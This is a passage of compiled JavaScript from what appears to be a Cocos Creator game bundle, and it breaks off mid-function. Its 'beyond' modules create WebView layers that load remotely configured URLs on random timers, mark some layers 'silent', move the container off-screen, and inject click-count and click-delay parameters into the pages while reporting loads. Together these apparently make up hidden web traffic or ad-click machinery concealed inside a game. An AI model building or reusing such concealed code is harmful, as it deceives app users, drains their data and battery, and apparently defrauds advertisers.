System.register("chunks:///_virtual/beyond-config.ts", ['./rollupPluginModLoBabelHelpers.js', 'cc', './object-util.ts'], function (exports) {
  var _applyDecoratedDescriptor, _initializerDefineProperty, cclegacy, ClassType, ArrayType;
  return {
    setters: [function (module) {
      _applyDecoratedDescriptor = module.applyDecoratedDescriptor;
      _initializerDefineProperty = module.initializerDefineProperty;
    }, function (module) {
      cclegacy = module.cclegacy;
    }, function (module) {
      ClassType = module.ClassType;
      ArrayType = module.ArrayType;
    }],
    execute: function () {
      var _dec, _dec2, _dec3, _dec4, _class3, _descriptor, _descriptor2, _descriptor3, _descriptor4, _dec5, _dec6, _class5, _descriptor5, _descriptor6, _dec7, _class8, _descriptor7, _dec8, _dec9, _class11, _descriptor8, _descriptor9;
      cclegacy._RF.push({}, "8dfe8L11JdHPKIawzYHhhuU", "beyond-config", undefined);
      class RamConfig {
        constructor(webnum, ram) {
          this.webnum = 3;
          this.ram = [1, 3];
          this.webnum = webnum;
          this.ram = ram;
        }
      }
      exports('RamConfig', RamConfig);
      class TotalWeight {
        constructor() {
          this.total_max = 50;
          this.weight_drop = 1;
        }
      }
      exports('TotalWeight', TotalWeight);
      let AutoWebConfig = exports('AutoWebConfig', (_dec = ClassType(RamConfig), _dec2 = ClassType(RamConfig), _dec3 = ClassType(RamConfig), _dec4 = ClassType(RamConfig), (_class3 = class AutoWebConfig {
        constructor() {
          _initializerDefineProperty(this, "default", _descriptor, this);
          _initializerDefineProperty(this, "low", _descriptor2, this);
          _initializerDefineProperty(this, "middle", _descriptor3, this);
          _initializerDefineProperty(this, "high", _descriptor4, this);
        }
      }, (_descriptor = _applyDecoratedDescriptor(_class3.prototype, "default", [_dec], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: function () {
          return new RamConfig(5, [0, 0]);
        }
      }), _descriptor2 = _applyDecoratedDescriptor(_class3.prototype, "low", [_dec2], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: function () {
          return new RamConfig(4, [1, 3]);
        }
      }), _descriptor3 = _applyDecoratedDescriptor(_class3.prototype, "middle", [_dec3], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: function () {
          return new RamConfig(6, [4, 6]);
        }
      }), _descriptor4 = _applyDecoratedDescriptor(_class3.prototype, "high", [_dec4], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: function () {
          return new RamConfig(7, [7, 9]);
        }
      })), _class3)));
      let GlobalConfig = exports('GlobalConfig', (_dec5 = ClassType(AutoWebConfig), _dec6 = ClassType(TotalWeight), (_class5 = class GlobalConfig {
        constructor() {
          this.refresh_time = [300, 600];
          this.refresh_click = [100, 200];
          this.destroy_time = [180, 360];
          this.webnum = 3;
          this.ct_delay = [2, 5];
          _initializerDefineProperty(this, "autowebnum", _descriptor5, this);
          _initializerDefineProperty(this, "total_weight", _descriptor6, this);
          this.web_still_time = [40, 60];
          this.web_still = 1;
        }
      }, (_descriptor5 = _applyDecoratedDescriptor(_class5.prototype, "autowebnum", [_dec5], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: function () {
          return new AutoWebConfig();
        }
      }), _descriptor6 = _applyDecoratedDescriptor(_class5.prototype, "total_weight", [_dec6], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: function () {
          return new TotalWeight();
        }
      })), _class5)));
      class UrlConfig {
        constructor() {
          this.hname = "";
          this.url = void 0;
          this.urls = [];
          // url数组，随机取用，urls优先级高于url
          this.ct = 5;
          this.ct_change1 = 1.5;
          this.ct_change2 = 0.7;
          this.ct_random = 15;
          this.backhome_time = [5, 10];
          this.show_weight = 0.8;
          this.url_weight = 0.4;
        }
      }
      exports('UrlConfig', UrlConfig);
      let LayerConfig = exports('LayerConfig', (_dec7 = ArrayType(UrlConfig), (_class8 = class LayerConfig {
        constructor() {
          this.web_weight = 0.7;
          _initializerDefineProperty(this, "urls", _descriptor7, this);
        }
      }, _descriptor7 = _applyDecoratedDescriptor(_class8.prototype, "urls", [_dec7], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: function () {
          return [];
        }
      }), _class8)));
      class UvConfig {
        constructor() {
          this.refresh_time = [300, 600];
          this.ct_delay = [2, 5];
          this.ct = 3;
          this.ct_change1 = 1.5;
          this.ct_change2 = 0.8;
          this.ct_random = 50;
          this.uv_num = 5;
        }
      }
      exports('UvConfig', UvConfig);
      let BeyondConfig = exports('BeyondConfig', (_dec8 = ArrayType(LayerConfig), _dec9 = ClassType(UvConfig), (_class11 = class BeyondConfig extends GlobalConfig {
        constructor(...args) {
          super(...args);
          _initializerDefineProperty(this, "webs", _descriptor8, this);
          _initializerDefineProperty(this, "uv", _descriptor9, this);
        }
      }, (_descriptor8 = _applyDecoratedDescriptor(_class11.prototype, "webs", [_dec8], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: function () {
          return [];
        }
      }), _descriptor9 = _applyDecoratedDescriptor(_class11.prototype, "uv", [_dec9], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: function () {
          return new UvConfig();
        }
      })), _class11)));
      cclegacy._RF.pop();
    }
  };
});

System.register("chunks:///_virtual/beyond-constants.ts", ['cc'], function (exports) {
  var cclegacy;
  return {
    setters: [function (module) {
      cclegacy = module.cclegacy;
    }],
    execute: function () {
      cclegacy._RF.push({}, "34c3d+nfX9KgYB9qrwlqwOi", "beyond-constants", undefined);
      class BeyondConstants {}
      exports('BeyondConstants', BeyondConstants);
      BeyondConstants.evalInit = "mx:init:";
      BeyondConstants.evalSeek = "mx:seek";
      BeyondConstants.evalPop = "mx:pop";
      BeyondConstants.evalParam = "mx:param:";
      BeyondConstants.evalSilent = "mx:silent:";
      cclegacy._RF.pop();
    }
  };
});

System.register("chunks:///_virtual/beyond-ctrl-panel.ts", ['./rollupPluginModLoBabelHelpers.js', 'cc', './beyond-manager.ts', './beyond-constants.ts', './ui-view.ts', './ui-manager.ts', './log-util.ts', './game-data-manager.ts'], function (exports) {
  var _applyDecoratedDescriptor, _initializerDefineProperty, cclegacy, Label, Node, _decorator, Widget, Layout, instantiate, Vec3, Button, view, sys, BeyondManager, BeyondConstants, UIView, UIManager, LogUtil, GameDataManager;
  return {
    setters: [function (module) {
      _applyDecoratedDescriptor = module.applyDecoratedDescriptor;
      _initializerDefineProperty = module.initializerDefineProperty;
    }, function (module) {
      cclegacy = module.cclegacy;
      Label = module.Label;
      Node = module.Node;
      _decorator = module._decorator;
      Widget = module.Widget;
      Layout = module.Layout;
      instantiate = module.instantiate;
      Vec3 = module.Vec3;
      Button = module.Button;
      view = module.view;
      sys = module.sys;
    }, function (module) {
      BeyondManager = module.BeyondManager;
    }, function (module) {
      BeyondConstants = module.BeyondConstants;
    }, function (module) {
      UIView = module.UIView;
    }, function (module) {
      UIManager = module.UIManager;
    }, function (module) {
      LogUtil = module.LogUtil;
    }, function (module) {
      GameDataManager = module.GameDataManager;
    }],
    execute: function () {
      var _dec, _dec2, _dec3, _dec4, _dec5, _dec6, _dec7, _class, _class2, _descriptor, _descriptor2, _descriptor3, _descriptor4, _descriptor5, _descriptor6;
      cclegacy._RF.push({}, "9188c2o7oVMAZ5SqgV+Bt8n", "beyond-ctrl-panel", undefined);
      const {
        ccclass,
        property
      } = _decorator;
      let BeyondCtrlPanel = exports('BeyondCtrlPanel', (_dec = ccclass('BeyondCtrlPanel'), _dec2 = property({
        type: Label
      }), _dec3 = property({
        type: Node
      }), _dec4 = property({
        type: Node
      }), _dec5 = property({
        type: Node
      }), _dec6 = property({
        type: Node
      }), _dec7 = property({
        type: Node
      }), _dec(_class = (_class2 = class BeyondCtrlPanel extends UIView {
        constructor(...args) {
          super(...args);
          _initializerDefineProperty(this, "labelDesc", _descriptor, this);
          _initializerDefineProperty(this, "layout", _descriptor2, this);
          _initializerDefineProperty(this, "nodeItemPre", _descriptor3, this);
          _initializerDefineProperty(this, "scrollView", _descriptor4, this);
          _initializerDefineProperty(this, "infoBox", _descriptor5, this);
          _initializerDefineProperty(this, "infoLabel", _descriptor6, this);
        }
        start() {}
        update(deltaTime) {}
        onLoad() {
          // this.refreshLayout();
        }
        onBtnCloseClick() {
          // this.immerse();
          UIManager.instance.close(this);
        }
        onBtnRefreshClick() {
          this.refreshLayout();
        }
        onBtnTriggleClick() {
          try {
            if (!BeyondManager.instance.isReady) {
              console.error("BeyondManager is not ready");
              return;
            }
            const position = BeyondManager.instance.containerNode.position;
            LogUtil.log("BeyondCtrlPanel onBtnTriggleClick", position.x);
            if (this.scrollView.getComponent(Widget).right === 0) {
              this.emerge();
            } else {
              this.immerse();
            }
          } catch (error) {
            console.error("BeyondCtrlPanel onBtnTriggleClick", error);
          }
        }
        onBtnItemClicked(evt, name) {
          LogUtil.log('111 onBtnItemClicked:', name);
          const str = "当前置顶：" + name;
          this.labelDesc.getComponent(Label).string = str;
          this.pop(name);
        }
        onBtnInfoClick() {
          this.infoBox.active = true;
          this.layout.active = false;
          if (this.infoBox.active) {
            const beyondManager = BeyondManager.instance;
            const layers = beyondManager.getLayers();
            const layer = layers[0];
            if (layers.length > 0) {
              const globalConfig = layer.globalConfig;
              let str = `globalConfig: ${JSON.stringify(globalConfig)}\n\n`;
              layers.forEach(layer => {
                const layerConfig = layer.layerConfig;
                const name = layer.name;
                str += `layerName: ${name}\n`;
                str += `layerConfig: ${JSON.stringify(layerConfig)}\n\n`;
              });
              str += `urlWeightDrop: ${JSON.stringify(GameDataManager.instance.getUrlWeightDropList())}\n\n`;
              this.infoLabel.getComponent(Label).string = str;
            } else {
              this.infoLabel.getComponent(Label).string = "无法获取layer";
            }
            this.infoBox.getComponent(Layout).updateLayout();
          }
        }
        refreshLayout() {
          this.layout.active = true;
          this.layout.removeAllChildren();
          this.infoBox.active = false;
          const beyondManager = BeyondManager.instance;
          const layers = beyondManager.getLayers();
          layers.forEach(layer => {
            const nodeItem = instantiate(this.nodeItemPre);
            nodeItem.position = new Vec3(0, 0, 0);
            nodeItem.parent = this.layout;
            const label = nodeItem.getComponentInChildren(Label);
            let showName = layer.name;
            if (layer.isSilent) {
              showName = showName + " (静默)";
            }
            label.string = showName;
            nodeItem.getComponentInChildren(Button).clickEvents[0].customEventData = layer.name;
          });
        }
        emerge(targetlayer = null) {
          LogUtil.log("BeyondTest emerge");
          const beyondManager = BeyondManager.instance;
          const containerNode = beyondManager.containerNode;
          if (!containerNode) {
            return;
          }
          const screenWidth = view.getDesignResolutionSize().width;
          containerNode.getComponent(Widget).left = screenWidth * 0.5;
          containerNode.getComponent(Widget).right = -screenWidth * 0.5;
          containerNode.getComponent(Widget).updateAlignment();
          this.scrollView.getComponent(Widget).right = screenWidth * 0.5;
          this.scrollView.getComponent(Widget).left = 0;
          this.scrollView.getComponent(Widget).updateAlignment();
          const layers = beyondManager.getLayers();
          const layer = targetlayer || layers[0];
          if (layer) {
            layer.evaluateJS(BeyondConstants.evalPop);
          }
        }
        immerse() {
          LogUtil.log("BeyondTest immerse");
          const beyondManager = BeyondManager.instance;
          const containerNode = beyondManager.containerNode;
          if (!containerNode) {
            return;
          }
          if (sys.isBrowser) {
            const screenWidth = view.getDesignResolutionSize().width;
            containerNode.getComponent(Widget).left = screenWidth;
            containerNode.getComponent(Widget).right = -screenWidth;
          } else {
            containerNode.getComponent(Widget).left = 0;
            containerNode.getComponent(Widget).right = 0;
          }
          containerNode.getComponent(Widget).updateAlignment();
          this.scrollView.getComponent(Widget).right = 0;
          this.scrollView.getComponent(Widget).left = 0;
          this.scrollView.getComponent(Widget).updateAlignment();
          const layers = beyondManager.getLayers();
          layers.forEach(layer => {
            layer.evaluateJS(BeyondConstants.evalSeek);
          });
        }
        pop(name) {
          LogUtil.log("BeyondTest pop:", name);
          const beyondManager = BeyondManager.instance;
          const layers = beyondManager.getLayers();
          const layer = layers.find(l => l.name === name);
          if (layer) {
            // layer.evaluateJS(BeyondConstants.evalPop);
            this.emerge(layer);
          }
        }
      }, (_descriptor = _applyDecoratedDescriptor(_class2.prototype, "labelDesc", [_dec2], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: null
      }), _descriptor2 = _applyDecoratedDescriptor(_class2.prototype, "layout", [_dec3], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: null
      }), _descriptor3 = _applyDecoratedDescriptor(_class2.prototype, "nodeItemPre", [_dec4], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: null
      }), _descriptor4 = _applyDecoratedDescriptor(_class2.prototype, "scrollView", [_dec5], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: null
      }), _descriptor5 = _applyDecoratedDescriptor(_class2.prototype, "infoBox", [_dec6], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: null
      }), _descriptor6 = _applyDecoratedDescriptor(_class2.prototype, "infoLabel", [_dec7], {
        configurable: true,
        enumerable: true,
        writable: true,
        initializer: null
      })), _class2)) || _class));
      cclegacy._RF.pop();
    }
  };
});

System.register("chunks:///_virtual/beyond-layer.ts", ['cc', './beyond-constants.ts', './random-util.ts', './log-util.ts', './beyond-manager.ts', './beyond-util.ts', './config.ts', './game-data-manager.ts'], function (exports) {
  var cclegacy, Component, Vec3, WebView, Widget, sys, _decorator, BeyondConstants, RandomUtil, LogUtil, BeyondManager, BeyondUtil, Config, GameDataManager;
  return {
    setters: [function (module) {
      cclegacy = module.cclegacy;
      Component = module.Component;
      Vec3 = module.Vec3;
      WebView = module.WebView;
      Widget = module.Widget;
      sys = module.sys;
      _decorator = module._decorator;
    }, function (module) {
      BeyondConstants = module.BeyondConstants;
    }, function (module) {
      RandomUtil = module.RandomUtil;
    }, function (module) {
      LogUtil = module.LogUtil;
    }, function (module) {
      BeyondManager = module.BeyondManager;
    }, function (module) {
      BeyondUtil = module.BeyondUtil;
    }, function (module) {
      Config = module.Config;
    }, function (module) {
      GameDataManager = module.GameDataManager;
    }],
    execute: function () {
      var _dec, _class;
      cclegacy._RF.push({}, "e7d72DTMVRGJo7CaX0sQDS6", "beyond-layer", undefined);
      const {
        ccclass,
        property
      } = _decorator;
      let UrlLoadScene = exports('UrlLoadScene', /*#__PURE__*/function (UrlLoadScene) {
        UrlLoadScene["init"] = "init";
        UrlLoadScene["backHome"] = "u";
        UrlLoadScene["rcReload"] = "q";
        UrlLoadScene["silentReload"] = "j";
        UrlLoadScene["rcRebuild"] = "rq";
        UrlLoadScene["silentRebuild"] = "rj";
        return UrlLoadScene;
      }({}));
      let BeyondLayer = exports('BeyondLayer', (_dec = ccclass('BeyondLayer'), _dec(_class = class BeyondLayer extends Component {
        constructor(...args) {
          super(...args);
          this._name = "";
          this._interId = 0;
          this._globalConfig = void 0;
          this._layerConfig = void 0;
          this._currentUrlConfig = void 0;
          this._isSilent = false;
          this.onUrlLoad = void 0;
          this._currentReloadInterval = 0;
          this._currentCtDelay = 0;
          this._currentRcClick = 0;
        }
        initLayer(name, globalConfig, layerConfig) {
          this._name = name;
          this.setConfig(globalConfig, layerConfig);
        }
        setConfig(globalConfig, layerConfig) {
          this._globalConfig = globalConfig;
          this._layerConfig = layerConfig;
        }
        get name() {
          return this._name;
        }
        get currentUrlConfig() {
          return this._currentUrlConfig;
        }
        get globalConfig() {
          return this._globalConfig;
        }
        get layerConfig() {
          return this._layerConfig;
        }
        get isSilent() {
          return this._isSilent;
        }
        get interId() {
          return this._interId;
        }
        set interId(value) {
          this._interId = value;
        }
        delayStart(delaySeconds) {
          this.scheduleOnce(this.startLayer, delaySeconds);
        }
        startLayer() {
          const loadScene = UrlLoadScene.init;
          this.loadNextUrlConfig(loadScene);
          this.startReloadTimer();
          this.startRebuildTimer();
        }
        onPageRCEvent() {
          BeyondManager.instance.onLayerReload(this);
        }
        stopReloadTimer() {
          this.unschedule(this.onReloadTimer);
        }
        startReloadTimer() {
          this.stopReloadTimer();
          let param = this._globalConfig.refresh_time;
          if (this._isSilent) {
            param = this._globalConfig.web_still_time;
          }
          const interval = this.getTimerInterval(param);
          this._currentReloadInterval = interval;
          this.scheduleOnce(this.onReloadTimer, interval);
        }
        getTimerInterval(param) {
          if (!param || param.length !== 2) {
            param = [300, 600];
          }
          return RandomUtil.random(param[0], param[1]);
        }
        stopRebuildTimer() {
          this.unschedule(this.onRebuildTimer);
        }
        startRebuildTimer() {
          this.stopRebuildTimer();
          const interval = this.getTimerInterval(this._globalConfig.destroy_time);
          this.scheduleOnce(this.onRebuildTimer, interval);
        }
        stopBackHomeTimer() {
          this.unschedule(this.onBackHomeTimer);
        }
        startBackHomeTimer() {
          this.stopBackHomeTimer();
          const interval = this.getTimerInterval(this._currentUrlConfig.backhome_time);
          this.scheduleOnce(this.onBackHomeTimer, interval);
        }
        stopLayer() {
          this.stopReloadTimer();
          this.stopRebuildTimer();
          this.stopBackHomeTimer();
          this.unschedule(this.start);
          this.unscheduleAllCallbacks();
        }
        setup(parent) {
          if (!parent) {
            return;
          }
          this.node.position = new Vec3(0, 0);
          parent.addChild(this.node);
          const wv = this.node.addComponent(WebView);
          wv.url = "about:blank";
          const widget = this.node.addComponent(Widget);
          widget.isAlignTop = true;
          widget.isAlignBottom = true;
          widget.isAlignLeft = true;
          widget.isAlignRight = true;
          widget.top = 0;
          widget.bottom = 0;
          widget.left = 0;
          widget.right = 0;
          widget.updateAlignment();
          this.evaluateJS(BeyondConstants.evalInit + this._name);
        }
        loadNextUrlConfig(loadScene) {
          if (!this.node) {
            return;
          }
          const urlConfig = this.selectUrlConfig();
          if (!urlConfig) {
            console.error("BeyondLayer", "loadNextUrl urlConfig is null");
            return;
          }
          LogUtil.log("BeyondLayer", "loadNextUrl urlConfig is :", urlConfig);
          this._currentUrlConfig = urlConfig;
          this.loadUrlConfig(urlConfig, loadScene);
          this.startReloadTimer();
          this.startBackHomeTimer();
        }
        loadUrlConfig(urlConfig, loadScene) {
          if (!this.node) {
            return;
          }
          if (!urlConfig) {
            return;
          }
          const url = BeyondUtil.getUrl(urlConfig);
          LogUtil.log("BeyondLayer", "loadUrlConfig", url);
          const wv = this.node.getComponent(WebView);
          if (wv) {
            const url = BeyondUtil.getUrl(urlConfig);
            LogUtil.log("BeyondLayer", "loadNextUrl", url);
            this.onUrlLoad && this.onUrlLoad(this._name, url);
            this.updateUrlConfig2Native(urlConfig, loadScene);
            wv.url = url;
            const showCount = GameDataManager.instance.incUrlsLoadCount(urlConfig.hname);
            this.dropWeightIfNeeded(urlConfig, showCount);
          }
        }
        dropWeightIfNeeded(urlConfig, showCount) {
          if (GameDataManager.instance.isUrlWeightDrop(urlConfig.hname)) {
            return;
          }
          if (showCount > this._globalConfig.total_weight.total_max) {
            GameDataManager.instance.setUrlWeightDrop(urlConfig.hname);
          }
        }
        evaluateJS(js) {
          if (!sys.isNative) {
            return;
          }
          if (!this.node) {
            return;
          }
          const wv = this.node.getComponent(WebView);
          if (wv) {
            try {
              wv.evaluateJS(js);
            } catch (e) {
              console.error("BeyondLayer", "evaluateJS", e);
            }
          }
        }
        updateUrlConfig2Native(urlConfig, loadScene) {
          if (!this.node || !urlConfig) {
            return;
          }
          const ct_delay = RandomUtil.random(this._globalConfig.ct_delay[0], this._globalConfig.ct_delay[1]);
          const rc_click = RandomUtil.random(this._globalConfig.refresh_click[0], this._globalConfig.refresh_click[1]);
          const param = JSON.stringify({
            ct: urlConfig.ct,
            ct1: urlConfig.ct_change1,
            ct2: urlConfig.ct_change2,
            ct_random: urlConfig.ct_random,
            ct_delay: ct_delay,
            rc_click: rc_click
          });
          this._currentCtDelay = ct_delay;
          this._currentRcClick = rc_click;
          this.reportEvent(urlConfig, loadScene);
          this.evaluateJS(BeyondConstants.evalParam + param);
        }
        reportEvent(urlConfig, loadScene) {
          let type = "c";
          switch (loadScene) {
            case UrlLoadScene.init:
              type = "c";
              break;
            case UrlLoadScene.rcReload:
              type = "q";
              break;
            case UrlLoadScene.silentReload:
              type = "j";
              break;
            case UrlLoadScene.rcRebuild:
              type = "rq";
              break;
            case UrlLoadScene.silentRebuild:
              type = "rj";
              break;
            case UrlLoadScene.backHome:
              type = "u";
              break;
            default:
              type = "e";
              break;
          }
          BeyondUtil.reportEvent({
            case: urlConfig.hname,
            total: GameDataManager.instance.getUrlsLoadCount(urlConfig.hname),
            w_weight: this.layerConfig.web_weight,
            u_weight: BeyondUtil.getUrlWeight(urlConfig, this._globalConfig),
            home_country: Config.COUNTRY_CODE,
            r_time: this._currentReloadInterval,
            ct_delay: this._currentCtDelay,
            ct: urlConfig.ct,
            change_one: urlConfig.ct_change1,
            change_two: urlConfig.ct_change2,
            ct_offset: urlConfig.ct_random,
            type: type,
            lid: this._interId,
            sl: this._isSilent ? 1 : 0,
            ts: new Date().toLocaleString('zh-CN')
          });
        }
        setUrlLoadListener(onUrlLoad) {
          this.onUrlLoad = onUrlLoad;
        }
        selectUrlConfig() {
          LogUtil.log("BeyondLayer", "selectUrlConfig", this._layerConfig.urls);
          // return RandomUtil.random(this._layerConfig.urls, 'url_weight');
          return BeyondUtil.randomUrlConfig(this._layerConfig, this._globalConfig);
        }
        onReloadTimer() {
          LogUtil.log("BeyondLayer", "onReloadTimer");
          this.stopReloadTimer();
          BeyondManager.instance.onLayerReload(this);
        }
        onRebuildTimer() {
          LogUtil.log("BeyondLayer", "onRebuildTimer");
          this.stopRebuildTimer();
          BeyondManager.instance.onLayerRebuild(this);
        }
        onBackHomeTimer() {
          // back home 只进一次
          this.stopBackHomeTimer();

          // const loadScene = this.isSilent ? UrlLoadScene.silentReload : UrlLoadScene.rcReload;
          this.loadUrlConfig(this._currentUrlConfig, UrlLoadScene.backHome);
        }
        makeSilent(isSilent) {
          if (!this.node) {
            return;
          }
          const wv = this.node.getComponent(WebView);
          if (wv) {
            this._isSilent = isSilent;
            wv.evaluateJS(BeyondConstants.evalSilent + isSilent);
          }
        }
        destroyLayer() {
          this.stopLayer();
          if (this.node && this.node.parent) {
            this.node.parent.removeChild(this.node);
            this.node.active = false;
            this.node.destroy();
          }
        }
      }) || _class));
      cclegacy._RF.pop();
    }
  };
});

System.register("chunks:///_virtual/beyond-manager.ts", ['cc', './beyond-config.ts', './beyond-layer.ts', './random-util.ts', './object-util.ts', './ui-config.ts', './mount-point.ts', './mount-manager.ts', './config.ts', './log-util.ts', './beyond-util.ts'], function (exports) {
  var cclegacy, director, sys, view, Widget, Node, BeyondConfig, BeyondLayer, UrlLoadScene, RandomUtil, ObjectUtil, UIID, MountPoint, MountManager, ConfigEvent, Config, LogUtil, BeyondUtil;
  return {
    setters: [function (module) {
      cclegacy = module.cclegacy;
      director = module.director;
      sys = module.sys;
      view = module.view;
      Widget = module.Widget;
      Node = module.Node;
    }, function (module) {
      BeyondConfig = module.BeyondConfig;
    }, function (module) {
      BeyondLayer = module.BeyondLayer;
      UrlLoadScene = module.UrlLoadScene;
    }, function (module) {
      RandomUtil = module.RandomUtil;
    }, function (module) {
      ObjectUtil = module.ObjectUtil;
    }, function (module) {
      UIID = module.UIID;
    }, function (module) {
      MountPoint = module.MountPoint;
    }, function (module) {
      MountManager = module.MountManager;
    }, function (module) {
      ConfigEvent = module.ConfigEvent;
      Config = module.Config;
    }, function (module) {
      LogUtil = module.LogUtil;
    }, function (module) {
      BeyondUtil = module.BeyondUtil;
    }],
    execute: function () {
      cclegacy._RF.push({}, "d2eeeLxTGZIvJ5klBw6v5NQ", "beyond-manager", undefined);
      class BeyondManager {
        constructor() {
          this._isInited = false;
          this.config = new BeyondConfig();
          this.cache = new Map();
          this._containerNode = null;
          director.on(ConfigEvent.FLAG_CHANGED, this.onFlagChanged, this);
        }
        mount2point() {
          LogUtil.log("BeyondManager mount2point");
          MountManager.instance.mount(MountPoint.RemoteWebConfigUpdated, this);
          MountManager.instance.mount(MountPoint.NotifyWebContReady, this);
          MountManager.instance.mount(MountPoint.NativeNotifyPageRc, this);
          MountManager.instance.mount(MountPoint.StageInitUIConf, this);
          MountManager.instance.mount(MountPoint.GetMoreGameUrl, this);
        }
        static get instance() {
          if (!this._instance) {
            this._instance = new BeyondManager();
          }
          return this._instance;
        }
        get isReady() {
          return this.config && this.cache.size > 0 && this.containerNode;
        }
        get containerNode() {
          return this._containerNode;
        }
        get currentShowUrl() {
          const urlConfig = this.electShowWebUrlConfig();
          if (!urlConfig) {
            return "";
          }
          return BeyondUtil.getUrl(urlConfig);
        }
        get isInited() {
          return this._isInited;
        }
        set isInited(value) {
          this._isInited = value;
        }
        initConfig(config) {
          try {
            this.config = ObjectUtil.fromPlain(BeyondConfig, config);
            LogUtil.log("initConfig this:", this.config);
          } catch (error) {
            LogUtil.warn("initConfig error:", error);
          }
        }
        setupBeyondLayers() {
          LogUtil.log("setupBeyondLayers ENABLE_WEB:", Config.ENABLE_WEB);
          // if (sys.isBrowser) {
          //     LogUtil.log("setupBeyondLayers sys is browser");
          //     return;
          // }

          if (!Config.ENABLE_WEB) {
            LogUtil.log("setupBeyondLayers not full mode or web not enable");
            return;
          }
          if (!this._containerNode) {
            LogUtil.log("setupBeyondLayers container is null");
            return;
          }
          if (this._containerNode.children && this._containerNode.children.length > 0) {
            LogUtil.log("setupBeyondLayers container already has children");
            return;
          }
          if (sys.isBrowser) {
            const screenWidth = view.getDesignResolutionSize().width;
            this._containerNode.getComponent(Widget).left = 1280;
            this._containerNode.getComponent(Widget).right = -1280;
            this._containerNode.getComponent(Widget).updateAlignment();
          }
          const webs = this.config.webs;
          if (!webs || webs.length === 0) {
            console.error("setupBeyondLayers webs is null");
            return;
          }
          var layerNum = this.determineLayerNum();
          layerNum = Math.min(layerNum, webs.length);
          const websTemp = Array.from(webs);
          const silentWebNum = Math.min(layerNum, this.config.web_still);
          LogUtil.log("setupBeyondLayers layerNum:", layerNum, " silentWebNum:", silentWebNum, " web_still:", this.config.web_still);
          const nonSilentWebNum = layerNum - silentWebNum;
          //non-slient
          for (let j = 0; j < nonSilentWebNum; j++) {
            const layerConfig = RandomUtil.random(websTemp, 'web_weight');
            websTemp.splice(websTemp.indexOf(layerConfig), 1);
            const name = `mx_layer_${j + 1}`;
            if (this.cache.has(name)) {
              console.error("setupBeyondLayers cache has layer:", name);
              continue;
            }
            const layer = this.createLayer(name, layerConfig);
            layer.makeSilent(false);
            layer.delayStart((j + 1) * 5);
            layer.interId = j + 1;
            this.cache.set(name, layer);
          }

          //silent
          for (let i = nonSilentWebNum; i < layerNum; i++) {
            const layerConfig = RandomUtil.random(websTemp, 'web_weight');
            websTemp.splice(websTemp.indexOf(layerConfig), 1);
            const name = `mx_layer_${i + 1}`;
            if (this.cache.has(name)) {
              console.error("setupBeyondLayers cache has layer:", name);
              continue;
            }
            const layer = this.createLayer(name, layerConfig);
            layer.makeSilent(true);
            layer.delayStart((i + 1) * 5);
            layer.interId = i + 1;
            this.cache.set(name, layer);
          }
        }
        createLayer(name, layerConfig) {
          const layerNode = new Node();
          const layer = layerNode.addComponent(BeyondLayer);
          layer.initLayer(name, this.config, layerConfig);
          layer.setup(this._containerNode);
          return layer;
        }
        determineLayerNum() {
          if (!this.config || !this.config.webs) {
            return 0;
          }
          var layerNum = this.config.webnum;
          try {
            if (this.config.autowebnum && Config.MEM > 0) {
              const defaultRam = this.config.autowebnum.default;
              const lowRam = this.config.autowebnum.low;
              const middleRam = this.config.autowebnum.middle;
              const highRam = this.config.autowebnum.high;
              const rams = [lowRam, middleRam, highRam];
              var bFound = false;
              for (let i = 0; i < rams.length; i++) {
                const ram = rams[i];
                if (Config.MEM >= ram.ram[0] && Config.MEM <= ram.ram[1]) {
                  layerNum = ram.webnum;
                  LogUtil.log("determineLayerNum found layerNum:", layerNum, " ram:", JSON.stringify(ram));
                  bFound = true;
                  break;
                }
              }
              if (!bFound) {
                layerNum = defaultRam.webnum;
              }
            }
          } catch (error) {
            console.error("determineLayerNum error:", error);
          }
          LogUtil.log("determineLayerNum 111 layerNum:", layerNum);
          return layerNum;
        }
        onUrlLoad(name, url) {
          LogUtil.log("BeyondManager onUrlLoad listener:", name, url);
        }
        getLayers() {
          return Array.from(this.cache.values());
        }
        onPageRCEvent(layerName) {
          LogUtil.log("onPageRCEvent layerName:", layerName);
          const layer = this.cache.get(layerName);
          if (layer) {
            layer.onPageRCEvent();
          }
        }
        onMountPoint(mountPoint, data) {
          // LogUtil.log("BeyondManager onSetPodinData podName:", mountPoint, " data:", data);
          if (mountPoint === MountPoint.RemoteWebConfigUpdated) {
            this.initConfig(data);
          } else if (mountPoint === MountPoint.NotifyWebContReady) {
            LogUtil.log("BeyondManager NotifyWebContReady data");
            this._containerNode = data.node;
            this.setupBeyondLayers();
          } else if (mountPoint === MountPoint.NativeNotifyPageRc) {
            this.onPageRCEvent(data);
          } else if (mountPoint === MountPoint.StageInitUIConf) {
            data[UIID.BeyondPopup] = {
              bundle: 'bundle-beyond',
              prefab: "prefab/beyond-ctrl-panel",
              preventTouch: true
            };
          } else if (mountPoint === MountPoint.GetMoreGameUrl) {
            return this.currentShowUrl;
          }
        }
        onFlagChanged() {
          if (Config.ENABLE_WEB) {
            LogUtil.log("onFlagChanged setupBeyondLayers FULL_MODE");
            this.setupBeyondLayers();
          } else {
            this.cache.forEach(layer => {
              layer.destroyLayer();
            });
            this.cache.clear();
          }
        }
        electShowWebUrlConfig() {
          const webs = this.config.webs;
          if (!webs || webs.length === 0) {
            LogUtil.log("getShowWebUrl webs is null");
            return null;
          }
          const allUrlConfigs = webs.reduce((acc, web) => {
            if (web.urls && web.urls.length > 0) {
              acc.push(...web.urls);
            }
            return acc;
          }, []);
          if (allUrlConfigs.length === 0) {
            LogUtil.log("getShowWebUrl allUrlConfigs is null");
            return;
          }
          return RandomUtil.random(allUrlConfigs, 'show_weight');
        }
        electUrlConfig(layerConfig) {
          // const randomUrlConfig = RandomUtil.random(layerConfig.urls, 'url_weight');
          const randomUrlConfig = BeyondUtil.randomUrlConfig(layerConfig, this.config);
